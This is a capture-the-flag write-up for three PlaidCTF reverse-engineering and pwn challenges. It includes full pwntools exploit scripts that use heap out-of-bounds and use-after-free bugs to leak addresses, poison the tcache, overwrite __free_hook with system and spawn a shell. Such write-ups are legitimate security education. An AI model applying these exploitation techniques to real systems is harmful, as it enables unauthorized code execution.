## Plaid Party Planning III

This is actually a very easy challenge, I don't know why it worth 500 points...

If we run the program, it will abort. After a little bit reverse engineering, it seems that we need to find the parameter input such that the abort will not be called, and then the flag will be generated.

```c
cprint(&v32, (__int64)"And I bought a ton of extra parmesan!", v10, v11, v12, v13);
mysleep(&v32, 5uLL);
cprint(&v33, (__int64)"Anyway, we brought you guys a gift.", v14, v15, v16, v17);
mysleep(&v33, 1uLL);
cprint(&v32, (__int64)"It's a flag!", v18, v19, v20, v21);
mysleep(&v32, 5uLL);
ptr = (void *)sub_555555555524(func_tab);
cprint(
  &func_tab[8].name,
  (__int64)"Let me take a look. It seems to say\n\tPCTF{%s}.",
  (__int64)ptr,
  (__int64)&func_tab[8],
  v23,
  v24);
```

Thus what if we cancel the abort function by putting a `ret` instruction at the `plt` entry of `abort` function? Also to make it less deterministic I also cancelled the `mysleep` function. Then I ran it directly and it seems that a deadlock situation is created, but when I ran it using `gdb`, the flag is printed!

## SPlaid Birch

### Reverse Engineering

`libsplaid.so.1` implements a tree-like data structure, should be binary tree, not sure it is AVL or not. The way to use it is to put the data structure as a field, and access the original data structure by using a negative offset, a common way to implement data structure without template in C.

However, the negative offset is annoying, since IDA cannot deal it very well, especially for function `0x555555554D4E`, which is hard to understand without proper decompile. My way to solve this is to copy the assembly out, change all `rdi` to `rdi+0x28` (so the argument becomes the original structure not the pointer to the field), then re-assemble using anything you want (I used `asm` in `pwntools`), and then patch the function using the result. Note that it will not be patched into executable to be executed, it is only patched into IDA database to help the analysis.

```python
#asm.py, codes is the assembly code copied from IDA
print hexlify(asm(codes, arch='amd64'))

#fixoff.py
from binascii import unhexlify
def patch_func(func_addr, hexchar):
	func_end = FindFuncEnd(func_addr)
	data = unhexlify(hexchar)
	size = func_end - func_addr
	assert size >= len(data)
	for i in xrange(len(data)):
		PatchByte(func_addr + i, ord(data[i]))
```

There might be better way to patch it such as using `IDAPython` to re-assemble directly, but I did not install `keypatch`.

Actually I did not reverse the whole binary even when I solved it, and I still don't know what function `0x555555554D4E` is doing.

### Exploitation

The vulnerability comes from the OOB of 

```c
__int64 __fastcall select(manager *a1, __int64 a2)
{
  data *v2; // rbx

  v2 = a1->buf[a2];                             // oob
  sp_select(a1, &v2->btent);
  return v2->var3;
}

__int64 __fastcall sp_select(manager *a1, btnode *a2)
{
  __int64 result; // rax

  result = (__int64)sub_894(a2, a1->some_calc);
  a1->root = (btnode *)result;
  return result;
}

btnode *__fastcall sub_894(btnode *cur, void (__fastcall *a2)(btnode *))
{
  btnode *cur_; // rbx
  btnode *v3; // rdi
  btnode *v4; // rax

  cur_ = cur;
  if ( !cur )
    return cur_;
  v3 = cur->parent;
  if ( !v3 ) //want this to be true, so `cur` will be returned directly
    return cur_;
//remaining part is not important
}
```

To exploit it, we can let `select` to choose a pointer that is on the heap, this can either be pointers that should be on the heap, or can be the pointer that we faked on the heap. Then this pointer will be regarded as `data` structure, as shown below

```assembly
00000000 data            struc ; (sizeof=0x48, align=0x8, mappedto_6)
00000000 var2            dq ?
00000008 var3            dq ?
00000010 num             dq ?
00000018 sum             dq ?
00000020 idx             dq ?
00000028 btent           btnode ?
00000048 data            ends

00000000 manager         struc ; (sizeof=0x38, align=0x8, mappedto_7)
00000000 root            dq ?                    ; XREF: main+39/w
00000008 compare         dq ?                    ; XREF: main+41/w
00000010 some_calc       dq ?                    ; XREF: main+4A/w
00000018 sub_555555554D36 dq ?                   ; XREF: main+53/w
00000020 next_size       dq ?                    ; XREF: main+6E/w
00000028 cur_size        dq ?                    ; XREF: main+5C/w
00000030 buf             dq ?                    ; XREF: main+65/w
00000038 manager         ends

00000000 btnode          struc ; (sizeof=0x20, align=0x8, copyof_10)
00000000 parent          dq ?                    ; offset
00000008 lnode           dq ?                    ; offset
00000010 rnode           dq ?                    ; offset
00000018 sum2            dq ?
00000020 btnode          ends
```

In order to make it not crash, we don't want this faked structure to get into complicated algorithm, so we want it to return from `sub_894` directly, that is to make `parent == null`, which is to make `[p + 0x28] == nullptr`. Also, since it will print the value of `var3`, we want `[p + 8] == address_we_want_to_leak`.

I think the comments in exploit explain my method well :)

```python
from pwn import *

g_local=True
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./splaid-birch", env={'LD_PRELOAD':'./libsplaid.so.1'})
	gdb.attach(sh)
else:
	sh = remote("splaid-birch.pwni.ng", 17579)

sendnum = lambda x: sh.sendline(str(x & 0xffffffffffffffff)) 
recvnum = lambda : int(sh.recvuntil('\n'), 10)

def add(v2, v3=0):
	sendnum(5)
	sendnum(v2)
	sendnum(v3)

def select(idx):
	sendnum(4)
	sendnum(idx)
	return recvnum()

def delete(v2):
	sendnum(1)
	sendnum(v2)

#0. prepare
add(3,0)
add(-0x28, 1) #used to clear root by producing nullptr(not useful)
add(2,0)

#rearange heap
delete(3)
delete(2)
delete(-0x28)
add(3,0)
add(-0x28, 1)
add(2,0)

#1. leak heap
#find a pointer in the heap such that
#	[p + 0x28] == nullptr
#	[p + 8] == heap addr
#that is pointer to btnode with lnode not null
# => p == 0x555555758398
heap_addr = select(0x10a8/8) - 0x1348
print hex(heap_addr)

select(5) # resume the root, idx == 5 is var2 == 2

#2. leak libc
#construct a pointer in the heap such that
#	[p + 0x28] == nullptr
#	[p + 8] == libc addr

# use manager.buf to construct unsorted bin
for i in xrange(0, 0x90):
	add(4 + i)
delete(0x35) # construct [p + 0x28] == nullptr
for i in xrange(0x90, 0xa0-5):
	add(4 + i)
# p == 0x3150
empty_root2 = heap_addr + 0x57c8
add(empty_root2) # used to prevent cycling
empty_root = heap_addr + 0x5788
add(empty_root) # used to prevent cycling
add(heap_addr + 0x3100)
add(u64("/bin/sh\x00")) 
#some preparation for shell

hv2 = heap_addr + 0x3150
add(hv2)

libc_addr = select(-7296 / 8) - 0x3ebca0
print hex(libc_addr)

select(0x528/8) # the one with var2 == heap150 is root

#3. get shell
#delete a root node with parent == nullptr
#select such that root points to the freed root node
#free it, cause double free
#tcache poison to rewrite __free_hook
delete(hv2) #delete root
select(-7456/8) #reset root to freed root node
delete(0) #double free, 0x50 chunk poisoned, var2 == next == nullptr == 0
select(-7536/8) #prevent cycle maybe? it will loop forever if we don't have this
#reset the root to prevent cycling, the fake root must be empty

add(libc_addr + e.symbols["__free_hook"])
select(-7616/8) #reset the root to prevent cycling, the fake root must be empty
add(libc_addr + 0x4f322) # consume bin
add(libc_addr + e.symbols["system"]) # rewrite here

add(u64("/bin/sh\x00")) 
delete(u64("/bin/sh\x00"))

sh.interactive()
```

## cppp

### Reverse Engineering

The C++ is quite hard to reverse, since there are a lot of inline functions. The key is to recognize `std::vector` and `std::basic_string` quickly, which is done by debugging and guessing. Don't try to get into static analysis of STL codes, which is hard and unnecessary to understand.

```c
struct string
{
  char *p;
  size_t len;
  size_t max_len;
  __int64 field_18;
};
struct kv
{
  int buf_size;
  char *p_buf;
  string name;
};
struct vector
{
  kv *beg;
  kv *end;
  kv *max_end;
};
```

The vulnerability comes from deleting a element in the middle. It will not `delete` the element we want to delete but will delete the last element, which causes UAF.

```c
item = &data.beg[idx_1];
if ( data.end != &item[1] )           // element to delete is not last one
{
  v22 = (char *)data.end - (char *)(item + 1);
  next_to_end_len = 0xAAAAAAAAAAAAAAABLL * (v22 >> 4); 
    				//magic compiler optimization
    				// == v22 / 0x30
  if ( v22 > 0 )
  {
    v24 = &item->name;
    do
    {
      v25 = (int)v24[1].p;
      v26 = v24;
      v24 = (string *)((char *)v24 + 48);
      LODWORD(v24[-2].p) = v25;
      v24[-2].len = v24[-1].field_18;
      std::__cxx11::basic_string::_M_assign(v26, v24);
      --next_to_end_len;
    }
    while ( next_to_end_len );
  }
}
v27 = data.end;
v28 = data.end[-1].p_buf;
--data.end;
if ( v28 )
  operator delete[](v28);
v15 = v27[-1].name.p;
v27[-1].p_buf = 0LL;
if ( v15 != (char *)&v27[-1].name.max_len )
  goto LABEL_18;
```

The loop body is a bit hard to understand due to compiler optimization, but it is clear if we look at assembly

```assembly
loc_555555555640:       ; get the next bufsize
mov     eax, [rbx+20h]
mov     rdi, rbx
add     rbx, 30h        ; rbx == next string
mov     [rbx-40h], eax  ; set this bufsize as next bufsize
mov     rax, [rbx-8]    ; get next buf
mov     [rbx-38h], rax  ; this buf = next buf
mov     rsi, rbx        ; this string = next string
call    _M_assign
sub     rbp, 1
jnz     short loc_555555555640 ; get the next bufsize
```

I think this is the copy constructor of `kv`

### Exploitation

The C++ heap is a bit messy since many copy constructor will be called, and a long `std::string` is constructed by continuously appending character, in which `malloc/free` may be called to extend the chunk size. I successfully constructed a leak by simply trial and error. :)

```python
from pwn import *

g_local=True
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

if g_local:
	sh = process("./cppp")
	gdb.attach(sh)
else:
	sh = remote("cppp.pwni.ng", 7777)

sh.recvuntil("Choice: ")

def add(name="1", buf="2"):
	sh.sendline("1")
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil("buf: ")
	sh.sendline(buf)
	sh.recvuntil("Choice: ")

def remove(idx):
	sh.sendline("2")
	sh.recvuntil("idx: ")
	sh.sendline(str(idx))
	sh.recvuntil("Choice: ")

def view(idx):
	sh.sendline("3")
	sh.recvuntil("idx: ")
	sh.sendline(str(idx))
	ret = sh.recvuntil('\n')
	sh.recvuntil("Choice: ")
	return ret[:-1]

#1. leak heap (don't need)
# add() #0
# add("uaf") #1
# remove(0) #1->0
# heap_addr = u64(view(0) + '\x00\x00') - 0x13290
# print hex(heap_addr)
#now 0 is UAF don't touch it

#2. leak libc, want UAF of unsorted bin
add() #0
add("U" * 0x800, 'A' * 0x800) #1
add("sep") #2 seperator
#also, it seems in this operation the vector will be extended,
#copy constructor of `kv` will be called, 
#(I guess the source code did not use r-value reference in C++11)
#so big chunk with 'U' will be `malloc` and `free` again, which makes leak possible
#but it was found by trial and error initially

remove(2)
remove(0) # 1->0

libc_addr = u64(view(0) + '\x00\x00') - 0x3ebca0
print hex(libc_addr)

#3. rewrite __free_hook and getshell
add() #1
add('\x00', 'D' * 0xb0) #2

remove(1)
remove(1)
#double free

#0xc0 tcache poisoned
add('\x00', p64(libc_addr + e.symbols["__free_hook"]).ljust(0xb0, '\x00'))
add('\x00', p64(libc_addr + e.symbols["system"]).ljust(0xb0, '\x00'))

sh.sendline("1")
sh.recvuntil("name: ")
sh.sendline("/bin/sh")
sh.recvuntil("buf: ")
sh.sendline("/bin/sh")

sh.interactive()
```

